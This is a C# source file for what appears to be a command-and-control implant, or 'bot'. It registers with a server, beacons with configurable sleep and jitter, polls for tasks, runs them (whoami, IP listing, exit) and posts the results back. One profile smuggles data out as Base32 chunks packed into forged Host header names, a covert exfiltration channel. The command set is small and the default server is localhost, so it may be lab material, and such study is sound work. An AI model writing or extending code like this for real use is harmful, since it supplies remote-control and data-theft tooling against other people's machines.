using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Web.Script.Serialization;

sealed class Rule
{
    public string method { get; set; }
    public string transport { get; set; }
    public string field { get; set; }
}
sealed class Config
{
    public string payload_uuid { get; set; }
    public Dictionary<string, Rule> profile { get; set; }
    public string server_url { get; set; }
}
sealed class StatusException : Exception
{
    public int Code { get; private set; }
    public StatusException(int code, string body) : base("HTTP " + code + ": " + body) { Code = code; }
}
sealed class Pending
{
    public int ID;
    public string Command;
    public string Result;
}
sealed class Client
{
    private readonly JavaScriptSerializer json = new JavaScriptSerializer { MaxJsonLength = 1048576 };
    private readonly Random random = new Random();
    private readonly string server = Environment.GetEnvironmentVariable("BOT_SERVER") ?? "http://127.0.0.1:5000";
    private readonly string profile = Environment.GetEnvironmentVariable("BOT_PROFILE") ?? "standard";
    private readonly string path;
    private readonly double sleep;
    private readonly double jitter;

    public Client()
    {
        path = Environment.GetEnvironmentVariable("BOT_CONFIG") ?? "payload-" + profile + ".json";
        sleep = double.Parse(Environment.GetEnvironmentVariable("BOT_SLEEP") ?? "5", CultureInfo.InvariantCulture);
        double j = double.Parse(Environment.GetEnvironmentVariable("BOT_JITTER") ?? "0.3", CultureInfo.InvariantCulture);
        jitter = Math.Max(0, Math.Min(1, j));
        if ((profile != "standard" && profile != "mixed" && profile != "host") || sleep <= 0 || double.IsNaN(sleep) || double.IsInfinity(sleep) || double.IsNaN(j))
            throw new ArgumentException("Invalid BOT_PROFILE, BOT_SLEEP or BOT_JITTER");
    }
    private Dictionary<string, object> Send(string method, string endpoint, string transport, string field, object value, string payload = "", string host = "")
    {
        string address = server.TrimEnd('/') + "/" + endpoint;
        string form = null;
        if (transport == "query" || transport == "form")
        {
            string text = value as string ?? json.Serialize(value);
            form = Uri.EscapeDataString(field) + "=" + Uri.EscapeDataString(text);
            if (transport == "query") address += "?" + form;
        }
        var request = (HttpWebRequest)WebRequest.Create(address);
        request.Method = method;
        request.Timeout = 5000;
        request.ReadWriteTimeout = 5000;
        request.AllowAutoRedirect = false;
        if (payload.Length > 0) request.Headers["X-Payload-UUID"] = payload;
        byte[] body = null;
        if (transport == "host") request.Host = host;
        else if (transport == "json")
        {
            body = Encoding.UTF8.GetBytes(json.Serialize(new Dictionary<string, object> { { field, value } }));
            request.ContentType = "application/json; charset=utf-8";
        }
        else if (transport == "form")
        {
            body = Encoding.UTF8.GetBytes(form);
            request.ContentType = "application/x-www-form-urlencoded; charset=utf-8";
        }
        else if (transport != "query") throw new ArgumentException("Unknown transport");
        try
        {
            if (body != null)
            {
                request.ContentLength = body.Length;
                using (var stream = request.GetRequestStream()) stream.Write(body, 0, body.Length);
            }
            else if (method == "POST") request.ContentLength = 0;
            using (var response = (HttpWebResponse)request.GetResponse())
            using (var reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8))
            {
                string text = reader.ReadToEnd();
                if ((int)response.StatusCode < 200 || (int)response.StatusCode >= 300) throw new StatusException((int)response.StatusCode, text);
                return json.Deserialize<Dictionary<string, object>>(text) ?? throw new FormatException("Empty JSON response");
            }
        }
        catch (WebException error)
        {
            var response = error.Response as HttpWebResponse;
            if (response == null) throw;
            using (response)
            using (var reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8))
                throw new StatusException((int)response.StatusCode, reader.ReadToEnd());
        }
    }
    private static string Base32(string text)
    {
        const string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        var output = new StringBuilder(); int buffer = 0, bits = 0;
        foreach (byte b in Encoding.UTF8.GetBytes(text))
        {
            buffer = (buffer << 8) | b; bits += 8;
            while (bits >= 5) { bits -= 5; output.Append(alphabet[(buffer >> bits) & 31]); buffer &= (1 << bits) - 1; }
        }
        if (bits > 0) output.Append(alphabet[(buffer << (5 - bits)) & 31]);
        return output.ToString();
    }

    private Dictionary<string, object> ProfileRequest(string endpoint, string operation, object value, Config config)
    {
        Rule rule = config.profile[operation];
        if (rule.transport != "host") return Send(rule.method, endpoint, rule.transport, rule.field, value, config.payload_uuid);
        string text = value as string ?? json.Serialize(value);
        int length = Encoding.UTF8.GetByteCount(text);
        if (length < 1 || length > 20000) throw new ArgumentException("Host data must be 1..20000 UTF-8 bytes");
        byte[] bytes = new byte[6];
        using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(bytes);
        string id = BitConverter.ToString(bytes).Replace("-", "").ToLowerInvariant();
        string encoded = Base32(text);
        int count = (encoded.Length + 49) / 50;
        Dictionary<string, object> result = null;
        for (int i = 0; i < count; i++)
        {
            string chunk = encoded.Substring(i * 50, Math.Min(50, encoded.Length - i * 50));
            string host = string.Format(CultureInfo.InvariantCulture, "m.{0}.{1}.{2}.{3}.demo.test", id, i + 1, count, chunk);
            result = Send(rule.method, endpoint, "host", rule.field, value, config.payload_uuid, host);
            if (i < count - 1 && !result.ContainsKey("received")) throw new FormatException("Server rejected Host part");
        }
        return result;
    }
    private Config LoadConfig()
    {
        bool saved = File.Exists(path);
        Config config;
        if (saved)
        {
            config = json.Deserialize<Config>(File.ReadAllText(path, Encoding.UTF8));
            if (config == null) throw new FormatException("Invalid config");
            if (config.server_url != server) throw new ArgumentException("BOT_SERVER does not match saved config");
        }
        else
        {
            config = json.ConvertToType<Config>(Send("POST", "payloads", "json", "profile", profile));
            if (config == null) throw new FormatException("Invalid payload response");
            config.server_url = server;
        }
        Guid uuid;
        if (!Guid.TryParse(config.payload_uuid, out uuid)) throw new FormatException("Invalid payload UUID");
        foreach (string operation in new[] { "checkin", "get_task", "post_task" })
        {
            Rule rule;
            if (config.profile == null || !config.profile.TryGetValue(operation, out rule) || rule == null ||
                (rule.method != "GET" && rule.method != "POST") ||
                (rule.transport != "json" && rule.transport != "form" && rule.transport != "query" && rule.transport != "host") ||
                string.IsNullOrWhiteSpace(rule.field) || rule.field.Length > 64 ||
                (rule.method == "GET" && rule.transport != "query" && rule.transport != "host"))
                throw new FormatException("Invalid profile rule " + operation);
        }
        if (!saved)
        {
            Directory.CreateDirectory(Path.GetDirectoryName(Path.GetFullPath(path)));
            File.WriteAllText(path, json.Serialize(config), new UTF8Encoding(false));
        }
        Console.WriteLine("Effective profile: " + ProfileName(config.profile) + (saved ? " (saved config)" : " (new config)"));
        return config;
    }
    private static string ProfileName(Dictionary<string, Rule> rules)
    {
        string[] operations = { "checkin", "get_task", "post_task" };
        string[][] definitions = {
            new[] { "standard", "POST/json/payload_uuid", "POST/json/callback_uuid", "POST/json/data" },
            new[] { "mixed", "GET/query/id", "POST/form/cb", "POST/form/data" },
            new[] { "host", "POST/host/payload_uuid", "POST/host/callback_uuid", "POST/host/data" }
        };
        foreach (var definition in definitions)
        {
            bool matches = rules.Count == 3;
            for (int i = 0; i < operations.Length; i++)
            {
                Rule rule = rules[operations[i]];
                matches &= rule.method + "/" + rule.transport + "/" + rule.field == definition[i + 1];
            }
            if (matches) return definition[0];
        }
        return "custom";
    }
    private static string Execute(string command)
    {
        switch (command)
        {
            case "whoami":
                using (var process = Process.Start(new ProcessStartInfo(Path.Combine(Environment.GetEnvironmentVariable("SystemRoot") ?? "C:\\Windows", "System32", "whoami.exe")) { UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true }))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    if (!process.WaitForExit(5000)) { process.Kill(); throw new TimeoutException("whoami timeout"); }
                    if (process.ExitCode != 0) throw new InvalidOperationException("whoami failed");
                    return output.Trim();
                }
            case "ip":
                var lines = new List<string>();
                foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
                    foreach (var address in nic.GetIPProperties().UnicastAddresses)
                        if (address.Address.AddressFamily is System.Net.Sockets.AddressFamily.InterNetwork || address.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
                            lines.Add($"{nic.Name}: {address.Address}");
                return lines.Count == 0 ? "IP адресов не нашёл" : string.Join("\n", lines);
            case "exit": return "Выхожу";
            default: throw new ArgumentException("Unknown command");
        }
    }

    public void Run()
    {
        Config config = LoadConfig();
        Console.WriteLine("Config: " + path + " Payload: " + config.payload_uuid);
        string callback = (string)ProfileRequest("checkin", "checkin", config.payload_uuid, config)["callback_uuid"];
        Guid uuid;
        if (!Guid.TryParse(callback, out uuid)) throw new FormatException("Invalid callback UUID");
        Console.WriteLine("Callback: " + callback);
        Pending pending = null;
        while (true)
        {
            try
            {
                if (pending == null)
                {
                    var task = ProfileRequest("poll", "get_task", callback, config)["task"] as Dictionary<string, object>;
                    if (task != null)
                    {
                        int id = (int)task["task_id"];
                        string command = (string)task["command"];
                        string result;
                        try { result = Execute(command); } catch (Exception error) { result = "Ошибка: " + error.Message; }
                        if (result.Length > 20000) result = result.Substring(0, 20000);
                        pending = new Pending { ID = id, Command = command, Result = result };
                        Console.WriteLine("Task: " + id + " " + command);
                    }
                }
                if (pending != null)
                {
                    ProfileRequest("results", "post_task", new { callback_uuid = callback, task_id = pending.ID, result = pending.Result }, config);
                    Console.WriteLine("Result sent: " + pending.ID);
                    if (pending.Command == "exit") return;
                    pending = null;
                }
            }
            catch (StatusException error)
            {
                if (error.Code >= 400 && error.Code < 500) throw;
                Console.WriteLine("Connection failed, retrying: " + error.Message);
            }
            catch (Exception error) { Console.WriteLine("Connection failed, retrying: " + error.Message); }
            double delay = Math.Max(0.1, sleep * (1 + (random.NextDouble() * 2 - 1) * jitter));
            // Thread.Sleep(TimeSpan) only accepts Int32 milliseconds on Framework 4.0.
            while (delay > 86400) { Thread.Sleep(86400000); delay -= 86400; }
            Thread.Sleep(TimeSpan.FromSeconds(delay));
        }
    }
}
static class Program
{
    static void Main()
    {
        Console.OutputEncoding = new UTF8Encoding(false);
        try { new Client().Run(); }
        catch (Exception error) { Console.Error.WriteLine(error.Message); Environment.Exit(1); }
    }
}
